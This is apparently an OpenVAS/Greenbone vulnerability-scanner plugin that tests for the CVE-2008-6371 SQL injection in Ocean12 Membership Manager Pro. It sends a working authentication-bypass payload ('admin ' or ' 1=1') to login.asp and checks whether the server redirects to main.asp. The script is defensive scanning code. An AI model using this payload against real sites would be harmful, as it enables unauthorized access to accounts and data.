# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100037");
  script_version("2024-06-13T05:05:46+0000");
  script_tag(name:"last_modification", value:"2024-06-13 05:05:46 +0000 (Thu, 13 Jun 2024)");
  script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2008-6371");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/32508");
  script_name("Ocean12 Membership Manager Pro 'login.asp' SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Ocean12 Membership Manager Pro is prone to an SQL-injection
 vulnerability because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to compromise the
 application, access or modify data, or exploit latent
 vulnerabilities in the underlying database.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_asp(port:port))exit(0);

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/default.asp";
  buf = http_get_cache(item:url, port:port);
  if( ! buf ) continue;

  if( egrep(pattern: "<title>Ocean12 Membership Manager Pro</title>", string: buf) &&
      egrep(pattern: '<form method="post" action="login.asp">', string: buf)) {

    host = http_host_name( port:port );
    variables = string("Username=admin ' or ' 1=1&Password=x");
    url = string(dir + "/login.asp");

    req = string(
      "POST ", url, " HTTP/1.0\r\n",
      "Referer: ","http://", host, url, "\r\n",
      "Host: ", host, "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(variables),
      "\r\n\r\n",
      variables );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(egrep(pattern: "Location: main.asp", string: res)) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
